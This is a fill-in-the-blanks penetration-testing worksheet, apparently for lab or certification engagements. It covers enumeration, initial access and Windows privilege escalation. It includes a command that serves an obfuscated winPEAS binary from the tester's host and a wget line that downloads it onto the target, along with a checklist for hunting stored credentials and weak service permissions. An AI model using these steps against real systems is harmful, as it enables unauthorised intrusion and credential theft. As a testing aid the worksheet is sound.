# Worksheet
Use the outputs from the doubletap scan here, run any necessary secondary scans included in the templates
in order to further enumerate the target. Based off findings make an audit list and proceed to Google.

## General Information
```
Hostname :
IP Address:
OS :
Version :
```
------------------------------------------------------------------------
Initial Access
------------------------------------------------------------------------
## Services (eg. SSH, SQL, SMTP, UDP(SNMP)...)
```




```

## NFS/SMB Drives
```


```

## Web Applications/Technologies (eg PHP, Apache, CMS...)
```



```

## Login Pages
```

```

## Found Users/Services/Credentials
```

```

## Audit Order
List based of perceived probability of success. Note steps taken.
```
1)
2)
3)
4)
5)
6)
```

## Notes
```


```

## Exploit Steps
```


```

------------------------------------------------------------------------
Privesc
------------------------------------------------------------------------
Follow the general order below for least to most intensive

Windows Path:
set PATH=%PATH%;C:\xampp\php;C:\Python27\Lib;C:\Python27\DLLs;C:\Python27\Lib\lib-tk

cd '/opt/privesc_scripts/winPEAS/winPEASexe/winPEAS/bin/Obfuscated Releases' && http 8888
wget <INSERTIPADDRESS>:8888/winPEASany.exe
  
## Kernel Vulnerablities
Get specific OS/patch versions and list possible exploits here:
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
```


```

## Users/Services/Credentials/Group Memebership
Try for reused passwords across accounts:
net localgroup administrators
runas /user:<UserName> program
```
```

## Scan Outputs
Use seatbelt.exe, or other tools to generate report
```
1) Autologin and stored keys
2) Config files, or files containing creds (sysprep, unattended, sysvol groups.xml)
3) User history
4) Drive Information (look for network drives and other mounted disks)
5) Scheduled tasks (icacls and accesschk.exe, find binaries that you can modify that are started as a service)
6) Internal Services (check for versions and exploits)
7) Weak folder permissions (dll hijacking)
8) Drivers

```

## Notes
```


```

## Exploit Steps
```


```
